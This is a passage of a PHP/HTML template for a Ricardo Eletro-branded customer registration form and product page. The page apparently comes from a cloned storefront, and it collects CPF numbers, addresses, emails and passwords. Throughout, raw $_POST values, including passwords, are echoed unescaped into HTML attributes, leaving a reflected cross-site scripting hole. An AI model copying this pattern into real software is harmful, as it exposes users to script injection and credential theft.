<input name="FoneEmpresa" type="text" id="FoneEmpresa" tabindex="9" value="<?=$_POST['FoneEmpresa']?>">
</div>
<div class="posicao">(DDD - 0000-0000 - Ramal)</div>
</div>
<div class="ramal input-container">
<input name="RamalEmpresa" type="text" id="RamalEmpresa" tabindex="10" value="<?=$_POST['RamalEmpresa']?>">
</div>
<div class="clear">
</div>
</div>
<div class="clear">
</div>
</div>
<div class="site">
<div class="text">site</div>
<div class="middle-input">
<div class="input input-container">
<input name="Site" type="text" id="Site" tabindex="11" value="<?=$_POST['Site']?>" maxlength="150">
</div>
<div class="posicao">(http://www.seusite.com)</div>
<div class="clear">
</div>
</div>
<div class="clear">
</div>
</div>
<div class="clear">
</div>
</div>
<div class="ramo-pj">
<div class="text">ramo de atividade</div>
<div class="select-atividade input-container">
<select conf="[{req:false}]" name="RamoAtividade" id="RamoAtividade" class="txt" tabindex="12">
<option value="" selected="selected">Selecione o ramo de atividade</option>
<option value="1">Artesanato</option>
<option value="2">Comercio Varejista</option>
<option value="3">Construcao Civil</option>
<option value="4">Cultura e Entretenimento</option>
<option value="5">Servicos</option>
<option value="6">Tecnologia da Informacao</option>
<option value="7">Turismo</option>
<option value="8">Textil e Confeccoes</option>
</select>
</div>
<div class="clear">
</div>
</div>
</div>
<div class="clear">
</div>
</div>

<div class="dados-pessoais">
<div class="titulo">dados pessoais</div>
<div class="barra">
</div>
<div class="dados-pessoais-form">
<div class="nome">
<div class="primeiro">
<div class="text">* primeiro nome</div>
<div class="input input-container">
<input type="text" maxlength="30" onkeypress="return Onlychars(event)" tabindex="13" id="Nome" name="Nome" value="<?=$_POST['Nome']?>">
</div>
<div class="clear">
</div>
</div>
<div class="sobrenome">
<div class="text">* sobrenome</div>
<div class="input input-container">
<input type="text" maxlength="70" onkeypress="return Onlychars(event)" tabindex="14" id="Sobrenome" name="Sobrenome" value="<?=$_POST['Sobrenome']?>">

</div>
<div class="clear">
</div>
</div>
<div class="clear">
</div>
</div>
<div class="apelido">
<div class="apelido-cliente">
<div class="text">como gostaria de ser chamado?<br>
<div class="posicao">(apelido)</div>
</div>
<div class="input input-container">
<input name="Apelido" type="text" id="Apelido" tabindex="15" value="<?=$_POST['Apelido']?>" maxlength="30">
</div>
<div class="clear">
</div>
</div>
<div class="nascimento">
<div class="data">
<div class="text">* data de nascimento</div>
<div class="data-nascimento input-container <? $verdado = "Data de Nascimento Invalida"; $verificar = strpos($todos,$verdado); if($verificar !== false){?>input-container-error<? } ?>">
<input type="text" OnKeyPress="formatar('##/##/####', this); return SomenteNumero(event)"  tabindex="16" maxlength="10" id="Nascimento" name="Nascimento" value="<?=$_POST['Nascimento']?>">
<? $verdado = "Data de Nascimento Invalida"; $verificar = strpos($todos,$verdado); if($verificar !== false){?>
<div class="msg-erro" forfield="Nome" forform="Cadastro"><div class="msg-erro-inner"><?=$verdado?></div></div>
<? } ?>
</div>
<div class="clear">
</div>
</div>
<div class="posicao">(dd/mm/aaaa)</div>
<div class="clear">
</div>
</div>
<div class="clear">
</div>
</div>
<div class="qualificacao">
<div class="sexo">
<div class="text">* sexo</div>

<div class="tipo input-container <? $verdado = "Selecione o <strong>sexo</strong>"; $verificar = strpos($todos,$verdado); if($verificar !== false){?>input-container-error<? } ?>">
<select conf="[{req:true,msg:'Selecione o &lt;b&gt;sexo&lt;/b&gt;'}]" tabindex="17" name="Sexo" id="Sexo" class="txt">
<option value="">Selecione o sexo</option>
<option value="M" <? if($sexo == 'M'){echo"selected";}?>>Masculino</option>
<option value="F" <? if($sexo == 'F'){echo"selected";}?>>Feminino</option>
</select>
<? $verdado = "Selecione o <strong>sexo</strong>"; $verificar = strpos($todos,$verdado); if($verificar !== false){?>
<div class="msg-erro" forfield="Nome" forform="Cadastro"><div class="msg-erro-inner"><?=$verdado?></div></div>
<? } ?>
</div>
<div class="clear">
</div>
</div>
<div class="profissao">
<div class="text">profissao</div>
<div class="tipo input-container">
<select name="Profissao" id="Profissao" class="txt" tabindex="18">
<option selected="selected" value="">Selecione a profissao</option>
<option value="1">Administrador(a)</option>
<option value="2">Advogado(a)</option>
<option value="3">Agronomo(a)</option>
<option value="4">Arquiteto(a)</option>
<option value="5">Artista Plastico</option>
<option value="8">Astronomo(a)</option>
<option value="6">Atleta</option>
<option value="7">Ator (Atriz)</option>
<option value="9">Autonomo(a)</option>
<option value="10">Bancario(a)</option>
<option value="11">Biologo(a)</option>
<option value="12">Botanico(a)</option>
<option value="13">Cineasta</option>
<option value="14">Contador(a)</option>
<option value="15">Designer</option>
<option value="16">Diplomata</option>
<option value="17">Enfermeiro(a)</option>
<option value="18">Engenheiro(a)</option>
<option value="19">Escritor(a)</option>
<option value="20">Estagiario(a)</option>
<option value="21">Estilista</option>
<option value="22">Fisioterapeuta</option>
<option value="23">Gastronomo</option>
<option value="24">Jornalista</option>
<option value="25">Marketing</option>
<option value="27">Militar</option>
<option value="26">Medico(a)</option>
<option value="28">Nutricionista</option>
<option value="29">Odontologista</option>
<option value="30">Operador(a) de Telemarketing</option>
<option value="31">Pedagogo(a)</option>
<option value="32">Policial</option>
<option value="33">Professor(a)</option>
<option value="34">Profissional Liberal</option>
<option value="35">Psicologo(a)</option>
<option value="36">Publicitario(a)</option>
<option value="37">Recepcionista</option>
<option value="38">Relacoes Publicas</option>
<option value="39">Secretaria</option>
<option value="40">Vendedor(a)</option>
<option value="41">Veterinario(a)</option>
<option value="42">Webdesigner</option>
<option value="43">Outros</option>
</select>
</div>
<div class="clear">
</div>
</div>
<div class="cpf-cliente" style="display: block;">
<div class="text">* cpf</div>
<div class="middle-input">
<div class="input input-container <? $verdado = "CPF invalido"; $verificar = strpos($todos,$verdado); if($verificar !== false){?>input-container-error<? } ?>" >
<input type="text" maxlength="14" OnKeyPress="formatar('###.###.###-##', this); return SomenteNumero(event)" value="<?=$_POST['Cpf']?>" tabindex="19" id="Cpf" name="Cpf">
<input type="hidden" tabindex="20"  id="CpfValido" name="CpfValido">
<? $verdado = "CPF invalido"; $verificar = strpos($todos,$verdado); if($verificar !== false){?>
<div class="msg-erro" forfield="Nome" forform="Cadastro"><div class="msg-erro-inner"><?=$verdado?></div></div>
<? } ?>
</div>
<div class="posicao">(somente numeros sem intervalos)</div>
<div class="clear">
</div>
</div>
<div class="clear">
</div>
</div>
<div class="clear">
</div>
</div>
<div class="contato">
<div class="primeiro">
<div class="text">* telefone 1</div>
<div class="middle">
<div class="ddd input-container">
<input type="text" maxlength="2" tabindex="21" id="DddContato1" value="<?=$_POST['DddContato1']?>" name="DddContato1">
</div>
<div class="tel-middle">
<div class="tel input-container">
<input name="FoneContato1" type="text" id="FoneContato1" tabindex="22 " OnKeyPress="formatar('####-#####', this); return SomenteNumero(event)" value="<?=$_POST['DddContato1']?>"maxlength="10">
</div>
<div class="posicao">(DDD - 0000-0000 - Ramal)</div>
<div class="clear">
</div>
</div>
<div class="ramal input-container">
<input name="RamalContato1" type="text" id="RamalContato1" tabindex="23" value="<?=$_POST['RamalContato1']?>">
</div>
<div class="clear">
</div>
</div>
<div class="clear">
</div>
</div>
<div class="segundo">
<div class="text">telefone 2</div>
<div class="middle">
<div class="ddd input-container">
<input name="DddContato2" type="text" id="DddContato2" tabindex="24" value="<?=$_POST['DddContato2']?>" maxlength="2">
</div>
<div class="tel-middle">
<div class="tel input-container">
<input name="FoneContato2" type="text" id="FoneContato2" tabindex="25" OnKeyPress="formatar('####-#####', this); return SomenteNumero(event)" value="<?=$_POST['FoneContato2']?>" maxlength="10">
</div>
<div class="posicao">(DDD - 0000-0000 - Ramal)</div>
<div class="clear">
</div>
</div>
<div class="ramal input-container">
<input name="RamalContato2" type="text" id="RamalContato2" tabindex="26" value="<?=$_POST['RamalContato2']?>">
</div>
<div class="clear">
</div>
</div>
<div class="clear">
</div>
</div>
<div class="celular">
<div class="text">celular</div>
<div class="middle">
<div class="ddd input-container">
<input name="DddContato3" type="text" id="DddContato3"  tabindex="27" value="<?=$_POST['DddContato3']?>" maxlength="2">
</div>
<div class="tel-middle">
<div class="tel input-container">
<input name="FoneContato3" type="text" id="FoneContato3" tabindex="28" OnKeyPress="formatar('####-#####', this); return SomenteNumero(event)" value="<?=$_POST['FoneContato3']?>" maxlength="10">
</div>
<div class="posicao">(DDD - 0000-0000)</div>
<div class="clear">
</div>
</div>
<div class="clear">
</div>
</div>
<div class="clear">
</div>
</div>
<div class="clear">
</div>
</div>
<div class="clear">
</div>
</div>
<div class="clear">
</div>
</div>
<div class="dados-endereco">
<div class="titulo">
<div class="text">dados de endereco</div>
<div class="aviso">(Digite o seu CEP e clique no botao OK para buscar o endereco)</div>
<div class="clear">
</div>
</div>
<div class="barra">
</div>
<div class="dados-endereco-form">
<div class="busca-cep">
<div class="middle-endereco">
<div class="dados-cep">
<div class="text">*CEP</div>
<div class="campo-dados">
<div class="campo-dados-um input-container">
<input type="text" onBlur="atualizacep(this.value)" OnKeyPress="formatar('#####-###', this); return SomenteNumero(event)" maxlength="9" id="cep" value="<?=$_POST['cep']?>" name="cep">
</div>
<div class="clear">
</div>
</div>
<div class="clear">
</div>
</div>
<div class="dados-buscacep">
<div tabindex="30" id="VerificaCEP" class="cep-ok">
<img src="https://www.imgeletro.com.br/site/re/button/btn_ok_verde.png">
</div>
<div class="text">
<a tabindex="31" target="_blank" href="http://www.buscacep.correios.com.br/servicos/dnec/menuAction.do?Metodo=menuEndereco">Nao sei meu CEP</a>
</div>
<div class="clear">
</div>
</div>
<div id="Cep" class="msg-retorno-cep">
</div>
<div class="clear">
</div>
</div>
<div class="clear">
</div>
</div>
<div class="barra">
</div>
<div class="busca-endereco"<? if(isset($_POST['Csadastrar']) or isset($_POST['cep'])){?> style="display:block;"<? }?>>
<div class="endereco">
<div class="local">
<div class="text">* endereco</div>
<div class="dados input-container">
<input type="text"  id="rua" name="rua" value="<?=$_POST['rua']?>">
</div>
<input type="hidden" value="Principal" id="Identificacao" name="Identificacao">
<div class="clear">
</div>
</div>
<div class="numero">
<div class="text">* numero</div>
<div class="dados input-container">
<input type="text" maxlength="11"  tabindex="33" id="Numero" name="Numero" value="<?=$_POST['Numero']?>">
</div>
<div class="clear">
</div>
</div>
<div class="complemento">
<div class="text">complemento</div>
<div class="dados input-container">
<input name="Complemento" type="text" id="Complemento" tabindex="34" value="<?=$_POST['Complemento']?>" maxlength="45">
</div>
<div class="clear">
</div>
</div>
<div class="clear">
</div>
</div>
<div class="bairro">
<div class="local">
<div class="text">* bairro</div>
<div class="dados input-container">
<input name="Bairro" type="text" id="Bairro" tabindex="35" value="<?=$_POST['Bairro']?>">
</div>
<div class="clear">
</div>
</div>
<div class="estado">
<div class="text">* estado</div>
<div class="dados input-container">
<input name="Estado" type="text" id="Estado" tabindex="36" value="<?=$_POST['Estado']?>">
</div>
<div class="clear">
</div>
</div>
<div class="cidade">
<div class="text">* cidade</div>
<div class="dados input-container">
<input name="Cidade" type="text" id="Cidade" tabindex="37" value="<?=$_POST['Cidade']?>">
</div>
<div class="clear">
</div>
</div>
<div class="clear">
</div>
</div>
<div class="referencia">
<div class="local">
<div class="text">ponto de referencia</div>
<div class="dados input-container">
<input type="text" maxlength="100" tabindex="38" id="Referencia" name="Referencia "value="<?=$_POST['Referencia']?>">
</div>
<div class="clear">
</div>
</div>
<div class="clear">
</div>
</div>
<div class="clear">
</div>
</div>
<div class="clear">
</div>
</div>
<div class="clear">
</div>
</div>
<div class="dados-identificacao">
<div class="titulo">
<div class="text">dados de identificacao</div>
</div>
<div class="barra">
</div>
<div class="dados-identificacao-form">
<div class="email">
<div class="campo-email">
<div class="text">* e-mail</div>
<div class="input input-container <? $verdado = "O E-mail digitado e invalido"; $verificar = strpos($todos,$verdado); if($verificar !== false or empty($email) and empty($email2)){?>input-container-error<? } ?>">
<input type="text" maxlength="60" tabindex="39" id="Email" name="Email" value="<?=$_POST['Email']?>">
<input type="hidden" id="EmailValido" name="EmailValido">
<? $verdado = "O E-mail digitado e invalido"; $verificar = strpos($todos,$verdado); if($verificar !== false){?>
<div class="msg-erro" forfield="Nome" forform="Cadastro"><div class="msg-erro-inner"><? if(empty($email) and empty($email2)) { echo $verdado2 = "Campo e-mail vazio";}else{ ?><?=$verdado?> <? }?></div></div>
<? } ?>
</div>
<div class="clear">
</div>
</div>
<div class="campo-email-confirma">
<div class="text">* confirme seu e-mail</div>
<div class="input input-container <? $verdado = "E-mail digitado nao sao iguais"; $verificar = strpos($todos,$verdado); if($verificar !== false or empty($email) and empty($email2)){?>input-container-error<? } ?>">
<input type="text" maxlength="60" tabindex="40" id="ConfirmeEmail" name="ConfirmeEmail" value="<?=$_POST['ConfirmeEmail']?>">
<? $verdado = "E-mail digitado nao sao iguais"; if(empty($email) and empty($email2)) {$verdado2 = "Campo e-mail vazio";} $verificar = strpos($todos,$verdado); $verificar2 = strpos($todos,$verdado2); if($verificar !== false or $verificar2 !== false){?>
<div class="msg-erro" forfield="Nome" forform="Cadastro"><div class="msg-erro-inner"><? if(empty($email) and empty($email2)) { echo $verdado2 = "Campo e-mail vazio";}else{ ?><?=$verdado?> <? }?></div></div>
<? } ?>
</div>
<div class="clear">
</div>
</div>
<div class="clear">
</div>
</div>
<div class="senha">
<div class="campo-senha">
<div class="text">* senha</div>
<div class="input input-container">
<input name="Senha" type="password" id="Senha" tabindex="41" value="<?=$_POST['Senha']?>" maxlength="32">
</div>
<div class="clear">
</div>
</div>
<div class="campo-senha-confirma">
<div class="text">* confirme sua senha</div>
<div class="input input-container">
<input name="ConfirmeSenha" type="password" id="ConfirmeSenha" tabindex="42" value="<?=$_POST['ConfirmeSenha']?>" maxlength="32">
</div>
<div class="clear">
</div>
</div>
<div class="clear">
</div>
</div>
<div class="email-oferta">
<div class="receber-email">
<div class="input">
<input type="checkbox" tabindex="43" id="Ofertas" name="Ofertas" value="1">
</div>
<div class="text">
<label for="Ofertas">Gostaria de receber por e-mail ofertas da Ricardo Eletro.</label>
</div>
<div class="clear">
</div>
</div>
<div class="receber-sms">
<div class="input">
<input type="checkbox" tabindex="44" id="Sms" name="Sms" value="1">
</div>
<div class="text">
<label for="Sms">Gostaria de receber SMS de ofertas da Ricardo Eletro.</label>
</div>
<div class="clear">
</div>
</div>
<p class="link-politica-privacidade">
<a href="http://ricardoeletro.com.br/Atendimento/Index/privacidade" target="_blank" class="">Termo de Uso e Politica de Privacidade</a>
</p>
<div class="clear">
</div>
</div>
<div class="barra">
</div>
<div class="clear">
</div>
</div>
<div class="clear">
</div>
</div>
<div class="finalizar-cadastro">
<div class="continuar">
<input type="submit" tabindex="46" value="" id="Cadastrar" name="Csadastrar">
</div>


<div class="auto-atendimento">
<a tabindex="45" id="bt_auto_atendimento" href="http://www.ricardoeletro.com.br/Atendimento/Index">
<img src="https://www.imgeletro.com.br/site/re/button/btn_auto_atendimento.png">
</a>
</div>
<div class="clear">
</div>
</div>
<div class="clear">
</div>
</div>
</div>

</div></form>
<? }}else{ ?>
<div class="content-min" id="Content">
<div class="content-etapas">
<div class="icone-titulo ">
<div class="icone-titulo-borda">
</div>
</div>
<div class="etapas-right">
<div class="titulo"><img src="/images/loading.gif" width="120" height="auto" style="float:left; margin-top:-20px;" /><div style="float:left; margin-top:25px;"> Redirecionando</div></div>
<div class="clear"></div>
<meta http-equiv="refresh" content="2;URL=/<?=$Eletro[0]?>/<?=$Eletro[1]?>/<?=$Eletro[2]?>/"> 
</div>
</div>

<? } ?>
<? }else{ ?>
  <div id="Content" class="content-min">

<div id="PrecoTravado">
<div class="seta-preta">
<a href="javascript:Produto_EncolherPrecoTravado();">
<img id="encolher" src="/images/site/re/button/btn_seta_direita_preta.png">
</a>
</div>
<div class="posicionamento">
<img src="/images/promocao/32480_20131216122455.gif">
<div>
<span class="texto-escuro">por</span> <span class="texto-verde">R$ 3.999,00</span>
</div>
<div>
<span class="texto-escuro">ou</span> <span class="texto-verde-menor">12x</span> <span class="texto-escuro">de</span> <span class="texto-verde-menor">R$ <?=$preco12?></span> <span class="texto-escuro">sem juros</span>
</div>
<div>
<span class="texto-cinza-menor">ou R$ 3.995,00 a vista com 0.1% de desconto</span>
</div>
<div class="botao-comprar">
<a href="/<?=$GBound[0]?>/<?=$GBound[1]?>/<?=$GBound[2]?>/carrinho/" id="btnComprar2" data-codigoproduto='<?=$row['id']*54?>' data-codigocomprejunto=''>
<img alt="<?=$row['productNameExc']?>" title="<?=$row['productNameExc']?>" src="/images/site/re/button/btn_comprar_agora2.png" />
</a>
</div>
</div>
</div>
<?=$row['menu']?>
<div id="ProdutoDetalhes" itemscope itemtype="http://schema.org/Product">
<div class="descricao-produto">
<div id="ProdutoDetalhesNomeProduto" itemprop="name">
<h1>
<?=$row["productNameExc"]?>
</h1>
<span id="ProdutoDetalhesCodigoProduto">codigo do produto: <?=$row['id']+4000*412?>
</span>
</div>
<div class="clear">
</div>
</div>
<div id="ProdutoDetalhamento">
<div class="barra produto-detalhamento-barra">
</div>
<?=$row['fotos']?>
<div id="ProdutoDetalhesDoProduto">

<div id="ProdutoDetalhesOpniaoDoProduto" style="height:70px;">
<div class="produto-detalhes-opniao-do-produto-left" style="height:70px;">
<div class="avaliacao-produto">
<div class="texto">opiniao dos consumidores:</div>
<div class="estrelas"itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<span class="star star_vazia">&nbsp;</span>
<span class="star star_vazia">&nbsp;</span>
<span class="star star_vazia">&nbsp;</span>
<span class="star star_vazia">&nbsp;</span>
<span class="star star_vazia">&nbsp;</span> <div style="display:none">
<span itemprop="ratingValue">0</span>
<span itemprop="bestRating">0</span>
<span itemprop="ratingCount">0</span>
</div>
</div>
</div>
<div class="facebook-curtir">
<div class="fb-like" href="47-4635-4638-385865.html" send="false" data-width="270" show_faces="false" data-layout="standard" >
</div> </div>
</div>
</div>
</div>
<div id="ProdutoDetalhesValoresEFrete">
<div id="ProdutoDetalhesValoresEFreteBotoesFreteProntaEntrega">
<div id="ProdutoDetalhesValoresEFreteBotaoFrete"> <img src="/images/promocao/32480_20131216122455.gif" />
</div>
<div class="clear">
</div>
</div>
<div id="ProdutoDetalhesPrecoComprarAgoraGeral">
<div id="ProdutoDetalhesPrecoComprarAgora" itemprop="offers" itemscope itemtype="http://schema.org/AggregateOffer">
<p id="ProdutoDetalhesPrecoComprarAgoraPrecoDe" class="produto-detalhes-preco-comprar-agora">de <span itemprop="highPrice">R$ <?=$priceOld2?> </span></p>
<p class="produto-detalhes-preco-comprar-agora">por <span class="produto-detalhes-preco-comprar-agora-preco-verde">R$</span> <span id="ProdutoDetalhesPrecoComprarAgoraPrecoDePreco" itemprop="lowPrice">
<?=$preco?>
</span>
</p>
<? $desconto = $row["price"] * 0.05; $totalDesconto = $row["price"] - $desconto; $totalFormatDesconto = number_format($totalDesconto, 2, ',', '.');?>
<p class="produto-detalhes-preco-comprar-agora">ou <span class="produto-detalhes-preco-comprar-agora-preco-verde">12x</span> de <span class="produto-detalhes-preco-comprar-agora-preco-verde">R$ <?=$preco12?></span> sem juros </p>
<input type="hidden" value="3999" name="total_hidden" id="total_hidden" />
<input type="hidden" value="0" name="acessorios_total_hidden" id="acessorios_total_hidden" />
<div class="preco_avista" itemprop="lowPrice">ou R$ <?=$totalFormatDesconto?> a vista com 5% de desconto</div>
<br>
<br>
<p id="ProdutoDetalhesPrecoComprarAgoraFormaPagamento" >
<a id="OutrasFormasPagamento" href="http://www.ricardoeletro.com.br/Pagamento/OutrasFormasPagamento/385865" data-fancybox-type="ajax" title="Formas de Pagamento">
<img src="/images/site/re/icons/ico_mais_cinza.png" />Veja outras formas de pagamento</a>
</p>
</div>
<div id="ProdutoDetalhesComprarAgora">
<div id="ProdutoDetalhesBotaoComprarAgora">
<a href="/<?=$Eletro[0]?>/<?=$Eletro[1]?>/<?=$Eletro[2]?>/carrinho/" id="btnComprar" data-codigoproduto='401490' data-codigocomprejunto=''>
<img alt="<?=$row['productNameExc']?>" title="<?=$row['productNameExc']?>" src="/images/site/re/button/btn_comprar_agora.png" />
</a>
</div>

<div style="display: none" class="produto-detalhes-botao-lista-desejos botao-lista-desejos-informacoes lista-desejo-itens">
<ul id="listas-desejo-cliente">
<li>
<a href="https://carrinho.ricardoeletro.com.br/Cliente/LoginRetorno/ListaDesejo/Produto/385865/" class="add-nova-lista"> Adicionar nova lista &gt;&gt; </a>
</li>
</ul>
</div>
</div>
<div class="clear">
</div>
</div>
<div id="ProdutoDetalhesConsulteValorParcelas">
<div id="ProdutoDetalhesConsulteValorParcelasTexto">Consulte o valor das parcelas no cartao</div>
<div id="ProdutoDetalhesConsulteValorParcelasSeta">
</div>
<div class="clear">
</div>
</div>
<div id="ProdutoDetalhesParcelamentoJuros">
<div style="width:165px;">
<p>1 x a vista R$ <?=$totalFormatDesconto?>
</p>
<p>2 x sem juros R$ <?=$preco2?>
</p>
<p>3 x sem juros R$ <?=$preco3?>
</p>
<p>4 x sem juros R$ <?=$preco4?>
</p>
</div>
<div style="width:165px;">
<p>5 x sem juros R$ <?=$preco5?>
</p>
<p>6 x sem juros R$ <?=$preco6?>
</p>
<p>7 x sem juros R$ <?=$preco7?>
</p>
<p>8 x sem juros R$ <?=$preco8?>
</p>
</div>
<div style="width:165px;">
<p>9 x sem juros R$ <?=$preco?>
</p>
<p>10 x sem juros R$ <?=$preco10?>
</p>
<p>11 x sem juros R$ <?=$preco11?>
</p>
<p>12 x sem juros R$ <?=$preco12?>
</p>
</div>
</div>
<div class="clear">
</div>
</div>
<div id="ProdutoDetalhesConsultaFrete" style="height:45px;">
<div>
<p class="produto-detalhes-consulta-frete-titulo">Consulte o frete:</p>
<p style="font-size:16px; margin-top:8px;">Frete GRATIS!</p>
</div>
<div id="ProdutoDetalhesConsultaFreteCampos">
<div id="ProdutoDetalhesConsultaFreteCamposFormConsulta">
<div id="ProdutoDetalhesDisponibilidade">
<p id="resposta" >
</p>
<p>
</p>
</div>
</div>
</div>
<div class="clear">
</div>
</div>
<div id="ProdutoDetalhesManualPrimeiroCapitulo">
<p>
<img id="BtnMaisDetalhes" src="/images/site/re/button/btn_mais_detalhes.png" />
</p>

</div>
</div>
<div class="clear">
</div>

<?=$row['descricao']?>
</div>
<script type="text/javascript" src="/static.criteo.net/js/universal/v0_5_4/criteo_ld.js" async="true">
</script>
<script type="text/javascript">var DADOS_CRITEO_CONF = [[{pageType: 'product','Customer ID': '','Site Type': '','Product ID': '401490'}], [3498, 'ppr', 'us.', '110', [[7714713, 7714714]], {'Customer ID': ['ci', 0], 'Site Type': ['site_type', 0], 'Product ID': ['i', 0]}]];ProcessaDadosCriteo();</script>
</div>
<? } ?>
<?
  }
}
}
?>